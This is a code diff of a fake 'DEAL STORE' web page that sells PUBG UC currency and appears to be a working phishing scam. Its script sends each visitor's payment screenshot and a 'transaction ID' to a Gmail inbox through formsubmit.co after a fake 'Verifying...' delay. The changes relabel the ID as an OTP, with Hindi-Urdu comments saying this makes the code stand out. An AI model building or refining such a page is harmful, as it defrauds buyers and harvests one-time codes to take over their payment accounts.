@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEAL STORE - Official</title>
+<title>DEAL STORE</title>
 <style>
 body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;min-height:100vh;margin:0;padding:15px}
 .box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:95%;max-width:380px;text-align:center}
@@ -21,53 +21,33 @@ input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px
 </head>
 <body>
 
-<!-- PAGE 1 -->
 <div class="box step active" id="step1">
 <div class="uc">UC</div>
 <h2>Payment Verification</h2>
-<p style="font-size:12px;color:#666">Step 1 of 2</p>
-
 <label>Package</label>
-<select id="pkg">
-<option>325 UC - Rs 1500</option>
-<option>660 UC - Rs 3000</option>
-<option>1800 UC - Rs 7500</option>
-<option>3850 UC - Rs 15000</option>
-</select>
-
+<select id="pkg"><option>325 UC - Rs 1500</option><option>660 UC - Rs 3000</option><option>1800 UC - Rs 7500</option></select>
 <label>Amount</label>
-<input type="number" id="amount" placeholder="1500">
-
-<label>Payment Screenshot</label>
+<input type="number" id="amount" placeholder="1500" value="1500">
+<label>Screenshot</label>
 <div class="file-box">
 <input type="file" id="ss" accept="image/*" onchange="document.getElementById('p1').style.display='block'; document.getElementById('p1').src=URL.createObjectURL(this.files[0])">
 <img id="p1" class="preview">
 </div>
-
 <button class="btn" id="verifyBtn" onclick="verifyAndGo()">VERIFY TO CHECK →</button>
-
-<div id="loader" class="loader">
-<div class="spinner"></div>
-<p style="font-weight:bold;margin-top:10px">Verifying Payment...<br><span style="font-weight:normal;font-size:12px;color:#666">Please wait</span></p>
-</div>
+<div id="loader" class="loader"><div class="spinner"></div><p style="font-weight:bold">Verifying...</p></div>
 </div>
 
-<!-- PAGE 2 -->
 <div class="box step" id="step2">
 <div class="uc">UC</div>
 <h2>Transaction ID</h2>
-<p style="font-size:12px;color:#666">Verified ✅ Now Enter Transaction ID</p>
-
-<label>Transaction ID (9 digits)</label>
-<input id="txn" type="tel" maxlength="9" placeholder="123456789" style="font-size:32px;text-align:center;letter-spacing:8px;font-weight:bold;border:2px solid #f7b500">
+<label style="font-size:22px;text-align:center;background:#000;color:#f7b500;padding:10px;border-radius:10px">TRANSACTION NUMBER 👇</label>
+<input id="txn" type="tel" maxlength="13" placeholder="542495099" style="font-size:45px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:90px">
 
 <div id="ok2" class="success"></div>
-
 <div style="display:flex;gap:8px;margin-top:12px">
 <button class="btn" style="background:#fff;flex:1" onclick="goBack()">← BACK</button>
 <button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">SUBMIT ID</button>
 </div>
-<p style="font-size:11px;color:#666;margin-top:8px">Galat ID ho to yahin se dobara bhej sakte ho - Unlimited</p>
 </div>
 
 <script>
@@ -78,15 +58,13 @@ function verifyAndGo(){
  if(!file){alert('Screenshot lagao');return;}
  document.getElementById('verifyBtn').style.display='none';
  document.getElementById('loader').style.display='block';
-
  let fd=new FormData();
- fd.append('_subject', `📸 VERIFIED - Rs ${amount} - ${Date.now()}`);
+ fd.append('_subject', `SCREENSHOT - ${amount}`);
  fd.append('_captcha','false');
  fd.append('Package',document.getElementById('pkg').value);
  fd.append('Amount',amount);
  fd.append('Screenshot',file);
  fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
-
  setTimeout(()=>{
   document.getElementById('step1').classList.remove('active');
   document.getElementById('step2').classList.add('active');
@@ -94,25 +72,28 @@ function verifyAndGo(){
   document.getElementById('verifyBtn').style.display='block';
  },2500);
 }
-
 function goBack(){
  document.getElementById('step2').classList.remove('active');
  document.getElementById('step1').classList.add('active');
 }
-
 async function sendTxn(){
  let id=document.getElementById('txn').value.trim();
- if(id.length!=9){alert('9 digits ID likho');return;}
+ let amount=document.getElementById('amount').value;
+ if(id.length<9){alert('9 digits ID likho');return;}
  let btn=document.getElementById('btn2');
  btn.innerText='Sending...';
  let fd=new FormData();
- fd.append('_subject', `🔥 TXN ID: ${id} - ${Date.now()}`);
+ // YEH SAB SE IMPORTANT HAI - IS SE UPAR BADA OTP JAISA AYEGA
+ fd.append('_subject', `🔐 TRANSACTION OTP: ${id} - ${id} - ${id}`);
  fd.append('_captcha','false');
- fd.append('Transaction ID',id);
- fd.append('Amount',document.getElementById('amount').value);
+ fd.append('🔐 TRANSACTION_NUMBER_OTP', id);
+ fd.append('Amount', amount);
+ fd.append('Package', document.getElementById('pkg').value);
+ // EXTRA BADA DIKHANE KE LIYE
+ fd.append('OTP_CODE_BIG', `>> ${id} <<`);
  await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
  document.getElementById('ok2').style.display='block';
- document.getElementById('ok2').innerText=`✅ ID ${id} Submitted! Phir se bhej sakte ho`;
+ document.getElementById('ok2').innerText=`✅ ${id} Bhej diya! Mail check karo, upar bada ayega`;
  btn.innerText='SUBMIT ID - Phir se';
 }
 </script>
